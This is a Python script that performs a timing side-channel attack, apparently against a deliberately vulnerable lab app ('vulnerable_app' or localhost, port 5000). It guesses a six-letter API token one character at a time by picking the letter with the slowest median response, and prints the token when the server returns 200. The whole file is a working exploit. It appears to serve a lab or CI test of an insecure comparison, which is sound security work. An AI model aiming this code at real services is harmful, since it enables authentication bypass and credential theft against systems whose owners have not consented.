import requests
import time
import sys
import statistics

def test_token_single(url, token):
    start = time.perf_counter_ns()
    try:
        response = requests.get(url, params={"token": token})
        if response.status_code == 200:
            print(f"TOKEN={token}")
            sys.exit(0)
        duration = time.perf_counter_ns() - start
        return duration
    except:
        return None

def main():
    IS_CI_RUN = len(sys.argv) > 1 and sys.argv[1] == "true"
    hostname = "vulnerable_app" if IS_CI_RUN else "localhost"
    url = f"http://{hostname}:5000/api/123"
    
    current_guess = ['a'] * 6 
    
    for pos in range(6):
        best_time = 0
        best_char = 'a'
        
        # Try each possible character
        for c in 'abcdefghijklmnopqrstuvwxyz':
            current_guess[pos] = c
            guess_str = "".join(current_guess)
            
            response = requests.get(url, params={"token": guess_str})
            if response.status_code == 200:
                print(f"TOKEN={guess_str}")
                sys.exit(0) 
            
            timings = []
            for _ in range(10):
                timing = test_token_single(url, guess_str)
                if timing:
                    timings.append(timing)
                time.sleep(0.05)
            
            if timings:
                avg_time = statistics.median(timings)
                if avg_time > best_time:
                    best_time = avg_time
                    best_char = c
                    
        current_guess[pos] = best_char
        print(f"Position {pos}: {best_char}")
   

if __name__ == "__main__":
    main()